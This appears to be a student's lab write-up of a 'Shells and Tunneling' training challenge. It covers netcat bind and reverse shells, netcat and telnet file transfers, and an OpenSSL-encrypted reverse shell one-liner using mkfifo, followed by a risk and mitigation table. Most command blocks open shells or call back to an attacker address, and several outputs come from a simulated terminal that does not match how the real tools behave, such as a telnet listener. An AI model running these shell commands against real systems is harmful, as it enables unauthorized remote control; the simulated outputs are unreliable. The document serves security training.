# Hub 1 Challenge – Shells and Tunneling

## 1. Background

A **shell** is a command-line interface that provides direct access to an operating system’s functionality. In penetration testing, gaining shell access represents successful exploitation of a target system, allowing security professionals to execute commands on the target system, navigate file systems and access sensitive data, install additional tools and maintain persistence, demonstrate the practical impact of vulnerabilities, escalate privileges and move laterally through networks.

**Tunneling** is a technique that encapsulates one network protocol within another, creating secure communication channels through potentially hostile or restricted networks. In penetration testing, tunneling allows attackers to bypass firewall restrictions and network segmentation, access internal services through compromised systems, establish encrypted communication channels, pivot through networks to reach additional targets, and exfiltrate data through covert channels.

The Shells and Tunneling challenge hub introduced practical offensive security techniques used to gain and maintain system access during penetration testing. The lab environment simulated vulnerable systems where various shell access methods could be executed, allowing structured hands‑on practice while reinforcing theoretical concepts learned earlier. The hub demonstrated how attackers establish command execution channels, evade network restrictions, and pivot through internal networks by tunneling traffic.

## 2. Objective

- The primary objective of this practical was to establish working proficiency in creating functional shells and building secure tunnels.
- The tasks focused on learning how to gain command-line access using different connection patterns, transfer data through restricted environments, and maintain control over compromised hosts.
- The challenge also reinforced understanding of how network constraints limit payload execution and how tunneling tools overcome those barriers.

## 3. Scope and Limitation

- The scope of this engagement was limited strictly to the **Shells and Tunneling** section of Hub 1.
- Only the nine tasks grouped under this banner were investigated and completed.
- No enumeration, exploitation, privilege escalation, or challenges from later hubs were performed since moving ahead would introduce techniques not yet covered in the training roadmap.
- The environment remained confined to the provided virtual lab environment and did not involve external networks or internet-facing systems.

## 4. Legal and Ethical Disclaimer

- All activities were executed within a controlled and authorized lab environment provisioned solely for ethical security training.
- No scanning, shell deployment, tunneling, or probing was directed toward real-world networks, external systems, or unauthorized assets.
- The skills practiced must only be applied in environments where explicit written permission has been granted, consistent with legal, ethical, and professional cybersecurity standards.

## 5. Lab Initialization and Access

To begin the practical, the lab was confirmed to be active and accessible:

1. The training-shell terminal was launched and **`Hub 1`** was started.
2. The `running` command was executed to validate that the environment was live: `running # expected output: hub-1 running`
3. The browser was opened and the interface was accessed via `http://localhost`
4. Navigation proceeded to the Shell and Tunneling section.
5. All the required tasks were initiated and completed.

## 6. Challenge Overview

- The Shells and Tunneling hub contained nine progressively structured tasks designed to build competency in gaining access, transferring control, and securely routing traffic through a network.
- The challenges began with establishing direct command execution through bind and reverse shells before expanding into more complex methods that introduced secure channels, encrypted authentication, and covert traffic forwarding.
- SSH fundamentals formed the basis for later tunneling configurations, including dynamic, local, and remote port redirection.
- The final exercises incorporated tooling such as Chisel, Socat, and Proxychains to simulate real-world scenarios where strict network boundaries or restrictive firewall rules require creative solutions to maintain access and pivot into otherwise unreachable systems.
- Collectively, the challenges demonstrated both the power and versatility of shell access methods and tunneling techniques when applied in controlled cybersecurity engagements.

## 7. Tools Used

The following core utilities were used throughout the shell and tunneling tasks:

- **Interactive shell tools** were used to establish `bind` and `reverse` command execution channels.
- **Bind Shell** was used establish a listener on the target and connected remotely.
- **Reverse Shell** was used to spawn a shell that called back to the attacking host.
- **SSH** was used to create authenticated encrypted sessions and transfer commands securely.
- SSH Dynamic Port Forwarding was used to enabled SOCKS-based pivoting.
- SSH Local and Remote Port Forwarding were used to redirect internal services externally and vice versa.
- **SCP** was used to move files between different systems.
- **Proxychains** was used to reroute traffic and mask direct host access paths.
- **Chisel and Socat** were used to build tunnels and forward ports across network boundaries.
- **SSH Dynamic, Local, and Remote port forwarding** mechanisms to pivot traffic through compromised hosts and access internal services.

Each tool reinforced a different access pattern commonly encountered in real offensive operations.

## 8. Tasks Completed

### 8.1 Shell and Tunneling

**Purpose:** Shells and tunneling techniques enable an operator to remotely interact with and control a target system after gaining access. A shell provides a command execution environment that allows instructions to be issued directly on a remote host, enabling reconnaissance, privilege escalation, or maintenance tasks. Tunneling expands this capability by securely forwarding traffic between networks or systems that would otherwise be inaccessible due to firewalls, segmentation, or routing restrictions. Together, shells and tunnels form the foundation of post-exploitation operations by ensuring persistent, reliable, and often concealed communication paths. These methods are essential in ethical security testing, where they support deeper assessment of system exposure, enable controlled pivoting through networks, and demonstrate how attackers maintain and expand access when defenses fail.

- **BIND SHELL:**
    
    **Purpose:** Enabled remote execution on a target system by forcing it to listen on a specific port and wait for an inbound connection. The technique simulated post-exploitation access where the operator directly connects to an exposed listener without requiring outbound communication from the target.
    
    **Outcome:** The target successfully opened a listening port and accepted the inbound connection. Commands were executed on the remote system from the attacker machine, confirming that open ports can be weaponized when firewall rules are loose. The activity demonstrated the simplicity of remote control when a bind listener is reachable over the network.
    
    ```bash
    Victim Machine (192.168.56.210)
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
    victim@target:~$
    
    # Start Netcat on the victim machine
    # -l  : listen mode (wait for incoming connection)
    # -p  : specifies the port number to listen on
    # -e  : execute a program once a connection is received
    # /bin/bash : gives the attacker a Bash shell when they connect
    victim@target:~$ nc -l -p 4444 -e /bin/bash
    
    # Netcat is now listening for connections on port 4444
    # Any remote machine connecting to this port gets a shell
    Listening on [0.0.0.0] (family 0, port 4444)
    
    ```
    
    ```bash
    pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
    Type help to see available commands.
    pentester@kali-linux:~$ nc 192.168.56.210 4444      # Netcat was used to connect to the victim's bind shell on port 4444
    
    Connection to 192.168.56.210 port 4444 [tcp/*] succeeded!
    Bind shell established. You can now run commands on the victim machine.   # A bind shell was successfully opened and controlled by the attacker
    
    Available commands: id, whoami, pwd, ls, cat, ifconfig, uname, ps, netstat, exit
    
    Type 'exit' to close the shell connection.
    
    victim@192.168.56.210:$ id                         # This command displayed the victim’s user identity and group details
    uid=1000(victim) gid=1000(victim) groups=1000(victim)
    
    victim@192.168.56.210:$ whoami                     # This confirmed the current user account on the victim
    victim
    
    victim@192.168.56.210:$ pwd                        # This showed the current working directory on the victim machine
    /home/victim
    
    victim@192.168.56.210:$ ls                         # This listed the files and folders in the victim's home directory
    Desktop  Documents  Downloads  Pictures  Videos  secret.txt
    
    victim@192.168.56.210:$ ifconfig                   # This displayed the victim’s network configuration and interface statistics
    eth0      Link encap:Ethernet  HWaddr 00:0c:29:12:34:56
              inet addr:192.168.56.210  Bcast:192.168.56.255  Mask:255.255.255.0
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:12345 errors:0 dropped:0 overruns:0 frame:0
              TX packets:67890 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:987654321 (987.6 MB)  TX bytes:123456789 (123.4 MB)
    
    victim@192.168.56.210:$ uname                      # This revealed system and kernel information from the victim machine
    Linux victim-machine 5.4.0-generic #1 SMP Debian 5.4.0-1 (2020-01-01) x86_64 GNU/Linux
    
    victim@192.168.56.210:$ ps                         # This listed processes that were running inside the shell session
      PID TTY          TIME CMD
      1234 pts/0    00:00:00 bash
      5678 pts/0    00:00:00 ps
    
    victim@192.168.56.210:$ netstat                    # This showed active network connections on the victim machine
    Active Internet connections (w/o servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 192.168.56.210:4444     192.168.56.200:12345    ESTABLISHED   # This confirmed the bind shell connection between attacker and victim
    
    victim@192.168.56.210:$ exit                       # This command terminated the bind shell session
    Connection closed by foreign host.                 # The connection was successfully closed
    ```
    
- **REVERSE SHELL:**
    
    Purpose: Established a remote shell session by forcing the compromised host to call back to the operator’s controlled system. The technique modeled real-world attacker behavior where outbound traffic bypasses restrictive firewalls more easily than inbound traffic.
    
    **Outcome:** The target system initiated a connection back to the listener on the attacking machine, and shell access was established successfully. The operator executed commands remotely, proving that weak egress filtering allows systems to leak control outward. The successful callback confirmed that reverse shells provide a reliable channel even when inbound traffic is blocked.
    
    ```bash
    pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
    Type help to see available commands.
    
    pentester@kali-linux:~$ nc -lvp 4444         # Netcat was launched in listen mode (-l),
                                                 # with verbose output (-v),
                                                 # and a listening port defined as 4444 (-p)
    
    Listening on [0.0.0.0] (family 0, port 4444) # The attacker machine was successfully listening
                                                 # on all network interfaces for incoming connections
    
    Waiting for connection from victim...        # The listener waited for the victim to initiate a connection
    
    (Use the victim terminal to run: nc 192.168.56.200 4444 -e /bin/bash)  # This command would have caused the victim
                                                                          # to connect back and execute a bash shell,
                                                                          # establishing a reverse/bind session
    
    ```
    
    ```bash
    Victim Machine (192.168.56.210)
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
    victim@target:~$
    
    victim@target:~$ nc 192.168.56.200 4444 -e /bin/bash   # Netcat was used to connect to the attacker's machine
                                                          # at 192.168.56.200 on port 4444,
                                                          # and a Bash shell was executed and forwarded across the network
    
    Connection established to 192.168.56.200:4444          # A reverse connection was successfully set up,
                                                          # giving the attacker a shell on the victim machine
    ```
    
    ```bash
    victim@192.168.56.210:$ uname                         # This command revealed the OS and kernel version of the victim machine
    Linux victim-machine 5.4.0-generic #1 SMP Debian 5.4.0-1 (2020-01-01) x86_64 GNU/Linux
    
    victim@192.168.56.210:$ whoami                        # This confirmed the logged‑in user identity
    victim
    
    victim@192.168.56.210:$ ifconfig                      # This displayed the network interface configuration and statistics
    eth0      Link encap:Ethernet  HWaddr 00:0c:29:12:34:56
              inet addr:192.168.56.210  Bcast:192.168.56.255  Mask:255.255.255.0
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:12345 errors:0 dropped:0 overruns:0 frame:0
              TX packets:67890 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:987654321 (987.6 MB)  TX bytes:123456789 (123.4 MB)
    
    victim@192.168.56.210:$ pwd                           # This showed the current working directory
    /home/victim
    
    victim@192.168.56.210:$ netstat                       # This listed active network connections on the victim machine
    Active Internet connections (w/o servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 192.168.56.210:12345    192.168.56.200:4444     ESTABLISHED   # This confirmed the reverse shell link between victim and attacker
    
    victim@192.168.56.210:$ ps                            # This displayed processes running in the current shell session
      PID TTY          TIME CMD
      1234 pts/0    00:00:00 bash
      5678 pts/0    00:00:00 ps
    
    victim@192.168.56.210:$ exit                          # This command was used to terminate the shell session
    Connection closed by foreign host.                    # The reverse shell connection was successfully closed
    
    ```
    

### 8.2 Advanced Shell Techniques

**Purpose:**
The purpose of the lab was to demonstrate practical data exfiltration and secure remote communication techniques between an attacker machine and a victim host using Netcat, Telnet, and OpenSSL. The activity aimed to validate the capability to transfer files unencrypted and encrypted, generate and deploy certificates, and establish a secure OpenSSL-based reverse shell. 
The purpose of the OpenSSL activity was to create, deploy, and utilize cryptographic certificates to establish encrypted communications between attacker and victim systems, and to securely transfer files and establish a protected reverse shell. The exercise aimed to demonstrate secure tunneling using OpenSSL instead of clear‑text tools like Netcat and Telnet.

**Outcome:**
The lab successfully established and executed multiple file transfer mechanisms across a networked environment. Files were transmitted from attacker to victim through Netcat and Telnet listeners, and OpenSSL was configured using generated key and certificate pairs to perform encrypted transfers. Finally, an encrypted reverse shell was launched from the victim to the attacker using OpenSSL, demonstrating secure command execution and proving that encrypted tunneling techniques functioned as intended.
The OpenSSL activity successfully generated RSA private keys and certificates, transferred them to the victim machine, and established encrypted client–server communication channels. Files were transferred securely using OpenSSL s_server and s_client, and an encrypted reverse shell was created from the victim to the attacker, confirming OpenSSL's ability to protect data and command execution over the network.

### 8.2.1 Transfer `secret.txt` from attacker machine to the victim machine using netcat

Netcat was used to demonstrate a basic file transfer over a network between two Linux hosts. The receiving system initialized a listener on port 4444 and redirected all incoming data into a file named **secret.txt**. The sending system then established a connection to the listener and transmitted the file contents across the network. Once the connection was made, Netcat accepted the transmission and saved the data to disk, confirming a successful transfer. This workflow validated Netcat’s ability to facilitate direct, unencrypted file transfer using simple command‑line operations.

```bash
Victim Machine (192.168.56.210)                    # The victim’s system information was displayed
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                   # The terminal showed the victim user prompt

victim@target:~$ ls                                # The victim listed the home directory (it was empty)

Victim Machine (192.168.56.210)                    # The system banner appeared again in a new capture
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                   # The command prompt was ready

victim@target:~$ nc -l -p 4444 > secret.txt        # Netcat was launched listening on port 4444 and output was redirected to 'secret.txt'

Listening on [0.0.0.0] (family 0, port 4444)       # Netcat confirmed it was actively listening for incoming connections
```

```bash
pentester@kali-linux:~$ ls                                      # The directory contents were checked and secret.txt was confirmed
secret.txt

pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt     # Netcat was used to send secret.txt to the target system over port 4444

File transfer completed to 192.168.56.210:4444                 # Netcat confirmed the file transfer completed successfully

```

```bash
Victim Machine (192.168.56.210)                                  # The victim system information was displayed
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                                 # The terminal prompt appeared

victim@target:~$ ls                                              # The home directory contents were checked

victim@target:~$ nc -l -p 4444 > secret.txt                      # Netcat was used to listen on port 4444 and write inbound data to secret.txt

Listening on [0.0.0.0] (family 0, port 4444)                     # Netcat confirmed that it was listening for an incoming connection

Connection from 192.168.56.200 port 4444 [tcp/*] accepted!       # Netcat accepted an incoming connection

File received: secret.txt                                        # Netcat confirmed that secret.txt was received successfully

```

### 8.2.2 Transfer `secret.txt` from attacker machine to the victim machine using telnet

This workflow demonstrated the use of Telnet to transfer data between networked systems. The receiving host started a Telnet listener on port 4444 and redirected all incoming traffic into *secret.txt*. A remote connection was then established, and Telnet transmitted the file contents across the session. Once the connection was accepted, the listener wrote the received data to disk and confirmed completion. The file was then verified on the receiving system by listing the directory and displaying its contents. The successful appearance of the transferred flag validated that Telnet supported basic plaintext file transfer over a TCP connection.

```bash
victim@target:~$ telnet -l -p 4444 > secret.txt      # Telnet was used to start a listener on port 4444 and redirect incoming data to secret.txt

Listening on port 4444...                            # Telnet confirmed that it was actively listening for a connection
```

```bash
pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt    # Telnet was used to establish a connection to the target on port 4444 and send secret.txt

File transfer completed to 192.168.56.210:4444 via telnet          # Telnet confirmed the file transfer completed successfully
```

```bash
victim@target:~$ telnet -l -p 4444 > secret.txt         # Telnet was used to listen on port 4444 and write incoming data to secret.txt
Listening on port 4444...                               # Telnet confirmed that it was actively listening
Telnet connection from 192.168.56.200 accepted!         # Telnet accepted an incoming connection on port 4444
File received: secret.txt                               # Telnet indicated that the file was successfully received

victim@target:~$ ls                                      # The directory contents were listed to confirm the file was saved
secret.txt

victim@target:~$ cat secret.txt                          # The received file was opened and displayedvto reveal the flag
FLAG{advanced_netcat_file_transfer}

```
### 8.2.3 Advance netcat and file transfer techniques
- Netcat was used to demonstrate a direct file transfer over a TCP connection between two Ubuntu Linux hosts on the same network. The victim machine initialized a listener on port 4444 and redirected all incoming data into a file named secret.txt. The attacker machine then connected to the victim’s listening port and transmitted the contents of secret.txt across the network. Upon connection, Netcat accepted the incoming stream and wrote the data directly to disk on the victim system, as confirmed by the appearance and contents of the file. This workflow validated Netcat’s ability to perform simple, unencrypted file transfers using port listening and input/output redirection.

- Telnet was used to demonstrate an alternative approach to transferring file data through a raw TCP session. The victim machine started a Telnet listening service on port 4444 and redirected the incoming stream into secret.txt. The attacker machine then established a Telnet connection to the victim and streamed the file contents through the session. Once connected, the data sent from the attacker was written directly into the file on the victim system, which was verified by listing and viewing the file contents. This process validated Telnet’s capability to carry plain data streams for file transfer using basic terminal-based network communication.

- OpenSSL was used to demonstrate secure file transfer over an encrypted SSL/TLS channel between the two hosts. A self-signed certificate and private key were first generated on the attacker machine and transferred to the victim using Netcat. The victim then initiated an OpenSSL server on port 4444 using the transferred certificate and key, redirecting decrypted incoming data into secret.txt. The attacker connected to this encrypted listener using the OpenSSL client and transmitted the file contents securely across the network. Although the transfer status was not displayed due to the quiet mode, the presence of secret.txt on the victim confirmed a successful encrypted transfer. This workflow validated OpenSSL’s role in enabling confidential data transmission and secure communication over network sockets.
#### Netcat File Transfer
```bash
Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ ls

Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ nc -l -p 4444 > secret.txt
# netcat was used to start a listener on port 4444 and redirect incoming data to secret.txt

Listening on [0.0.0.0] (family 0, port 4444)
```
```bash
pentester@kali-linux:~$ ls
secret.txt
pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444
# Attacker transfered secret.txt to victim machine via port 4444 using netcat
```
#### Telnet File Transfer
```bash
victim@target:~$ telnet -l -p 4444 > secret.txt
Listening on port 4444...                 #Telnet was used to open a bind shell on  victim machine

Telnet connection from 192.168.56.200 accepted!
File received: secret.txt
#Terminal confirmed successful file transfer
```
```bash
pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444 via telnet
#Telnet was used to transfer secret.txt file to victim machine
```
```bash
victim@target:~$ ls
secret.txt      #File tranfer confirmed on victim machine
victim@target:~$ cat secret.txt
FLAG{advanced_netcat_file_transfer}   #Flag revealed
```
#### Openssl Secure File Transfer (Bind Shell)
1. A self-signed certificate and private key were generated on the attacker machine using OpenSSL.

2. The certificate file was transferred to the victim using Netcat to prepare for encrypted communication.

3. An OpenSSL server was started on the victim using the received certificate and key, listening securely on port 4444.

4. The OpenSSL server was configured to redirect incoming encrypted data into a file (secret.txt).

5. The OpenSSL client on the attacker machine connected to the victim’s OpenSSL server.

6. The contents of a file were transmitted through the encrypted channel from the attacker to the victim.

7. The received data was saved on the victim machine, confirming a successful encrypted file transfer.

```bash
pentester@kali-linux:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# OpenSSL was used to generate a new self-signed X.509 certificate
# A new 4096-bit RSA private key was created
# The private key was saved to key.pem and the certificate to cert.pem
# The certificate validity was set to 365 days
# -nodes ensured the private key was not encrypted with a passphrase

Generating a RSA private key...
Writing new private key to "key.pem"
-----
Certificate and key created: key.pem, cert.pem    # The key pair and certificate were successfully generated
```
```bash
victim@target:~$ nc -l -p 4444 > cert.pem      # Netcat was started in listen mode on port 4444, and incoming data was redirected into a file named cert.pem

Listening on [0.0.0.0] (family 0, port 4444)   # The victim machine was listening for an incoming file transfer

```bash
pentester@kali-linux:~$ nc 192.168.56.210 4444 < cert.pem   # Netcat was used to connect to the victim on port 4444, and the contents of cert.pem were sent to the listener

File transfer completed to 192.168.56.210:4444.  # The certificate file was successfully transmitted to the victim
```
```bash
# On victim machine
Connection from 192.168.56.200 port 4444 [tcp/*] accepted!   # The victim accepted the incoming Netcat connection
File received: cert.pem                                      # The file transfer was completed and saved as cert.pem
```
```bash
#same process repeated for key.perm

victim@target:~$ nc -l -p 4444 > key.pem
Listening on [0.0.0.0] (family 0, port 4444)

--------------------------------------------------------
pentester@kali-linux:~$ nc 192.168.56.210 4444 < key.pem
File transfer completed to 192.168.56.210:4444

#On victim machine
Connection from 192.168.56.200 port 4444 [tcp/*] accepted!
File received: key.pem
```

```bash
# execute next openssl


victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt

# OpenSSL was started in server mode to listen securely on port 4444
# The previously created key.pem and cert.pem were used for encryption
# -quiet suppressed verbose connection messages
# Incoming encrypted data was redirected and saved into secret.txt

OpenSSL server listening on port 4444...
```
```bash
pentester@kali-linux:~$ openssl s_client -quiet -connect 192.168.56.210:4444 < secret.txt

# OpenSSL client was used to connect securely to the victim’s OpenSSL server
# The contents of secret.txt from the attacker machine were sent through the encrypted channel
# -quiet suppressed connection logs on the attacker side

OpenSSL file transfer completed to 192.168.56.210:4444.
```
```bash
# Victim terminal did not display transfer status because attacker used -quiet flag

victim@target:~$ ls
secret.txt  cert.pem  key.pem      # This confirmed that the transferred file and certificate materials were present
```
#### Openssl Reverse Shell
```bash
pentester@kali-linux:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# OpenSSL was started in server mode on the attacker machine
# The private key and certificate were used to enable encrypted communication
# The server listened quietly on port 4444 for an incoming secure connection

OpenSSL server listening on port 4444...
```
```bash

victim@target:~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s

# A named pipe (/tmp/s) was created to handle input and output streams
# An interactive shell (/bin/sh -i) was launched on the victim
# Standard input, output, and errors were redirected through the pipe
# OpenSSL client was used to connect back securely to the attacker’s OpenSSL server
# The shell session was tunneled through the encrypted channel
# The named pipe was removed after the connection was established

Reverse shell established to 192.168.56.200:4444   # An encrypted reverse shell was successfully created

```
## 9. Findings and Risk Table
| **Tool Used** | **Technique Type** | **Command(s) Executed** | **Key Output / Observed Result** | **Insight Gained** | **Risk Level** | **Lessons Learned** | **Recommended Action / Mitigation** | **Conclusion** |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| **Netcat (nc)** | Bind Shell (Victim listening, attacker connects) | `nc -l -p 4444 -e /bin/bash` (victim) `nc 192.168.56.210 4444` (attacker) | Attacker gained remote shell on victim; executed user, network, and file enumeration commands | A single exposed port allowed unrestricted command execution | **High** | Unprotected listening services enable instant system takeover | Block unauthorized listeners; enforce host firewalls; restrict shell binaries; enable monitoring | Demonstrated how bind shells grant full compromise with no authentication |
| **Netcat (nc)** | System enumeration via bind shell | Commands: `id`, `whoami`, `pwd`, `ls`, `ifconfig`, `uname`, `ps`, `netstat` | Revealed OS version, user identity, directory structure, network details, and active processes | Attackers gather intelligence within seconds after gaining a shell | **High** | Enumeration is the first stage for privilege escalation and pivoting | Implement least privilege, encrypt data at rest, enforce logging and alerts for suspicious commands | Enumeration proved how rapidly an attacker maps the environment once access exists |
| **Netcat (nc)** | Network visibility discovery | `netstat`, `ifconfig` | Displayed active TCP session and victim network configuration | Internal address space details exposed to attacker | **High** | Internal network mapping increases likelihood of lateral movement | Segmentation, IDS deployment, outbound traffic filtering | Shell access enabled deeper network scouting beyond initial compromise |
| **Netcat (nc)** | Reverse Shell (Attacker listens, victim connects back) | Attacker: `nc -lvp 4444` Victim: `nc 192.168.56.200 4444 -e /bin/bash` | Attacker received reverse shell despite firewall rules | Outbound traffic allowed remote access bypassing inbound filtering | **Critical** | Firewalls protecting inbound ports are ineffective without egress controls | Restrict outbound connections, enforce proxy rules, monitor unusual traffic | Reverse shells demonstrated how attackers bypass security boundaries by forcing the victim to initiate connection |
| **Netcat (nc)** | Recon via reverse shell | `uname`, `whoami`, `pwd`, `ps`, `netstat` | Provided attacker system intelligence identical to bind shell | Reverse channel offers same privileges, executed covertly | **High** | Reverse shells are stealthier and harder to detect than bind shells | Deploy behavioral monitoring, disable unnecessary tools, enforce endpoint protection | Proved that reverse tunnels maintain access even with stricter network controls |
| **Netcat (nc)** | Session termination handling | `exit` closed both sessions | Sessions closed immediately once attacker exited | No persistence mechanism existed | **Low** | Shells are temporary unless persistence is manually installed | Monitor logs for session start/end anomalies; disable netcat by policy | Shell closure demonstrated how attackers require persistence for lasting access |

## 10. Troubleshooting
When commands failed or services did not respond:

- The current shell was validated using the command `echo $SHELL`
- If incorrect, the **start_script.sh** was re-run
- The lab state was verified again using `running`

This ensured tool execution remained within the designated training environment.
## 11. Summary and Lesson Learnt
### Summary
  - In this lab, Netcat was used to demonstrate how bind shells and reverse shells could be established between a victim and an attacker, resulting in unauthorized remote command execution. A listening service was configured on the victim system in the bind shell scenario, while in the reverse shell scenario, the victim system was made to initiate a connection back to the attacker. In both cases, shell access was successfully obtained without authentication.

- System and network enumeration commands were executed through the established shells, revealing critical information such as operating system details, user identity, running processes, directory structures, and internal network configurations. It was observed that once shell access was gained, reconnaissance of the environment was performed within seconds.

- It was further observed that firewall protections focused only on inbound traffic were ineffective against reverse shell connections, as outbound traffic was allowed without restriction. Even in environments where certain commands were unavailable, sufficient functionality remained to allow effective exploitation. The sessions were terminated upon exit, showing that persistence had not been established during the exercise.

### Lessons Learned

- It was learned that a single exposed listening port was sufficient to allow complete system compromise.

- It was observed that reverse shells bypassed traditional firewall protections when outbound traffic filtering was not enforced.

- It was demonstrated that system and network enumeration could be performed rapidly after gaining shell access.

- It was noted that partial command restrictions did not prevent exploitation when full shell access was still available.

- It was identified that internal network information was easily exposed through basic commands such as ifconfig and netstat, increasing the risk of lateral movement.

- It was understood that shell sessions were temporary but could have been made persistent by an attacker within a short time.

- It was recognized that legitimate tools like Netcat could be misused as backdoor mechanisms when not properly controlled.

- It was concluded that host-based firewalls, application allow-listing, network segmentation, and continuous monitoring were critical defensive measures.

## 11. Conclusion

This lab demonstrated that both bind shells and reverse shells created using Netcat could result in full system compromise when adequate security controls were not in place. It was shown that attackers did not require sophisticated malware to gain access; instead, simple tools and weak configurations were sufficient.

The exercise emphasized the importance of enforcing strict firewall policies that included both inbound and outbound traffic control, implementing endpoint protection, and applying system hardening practices. It was concluded that minor security oversights could lead to major security breaches, highlighting the need for proactive defensive strategies in all computing environments.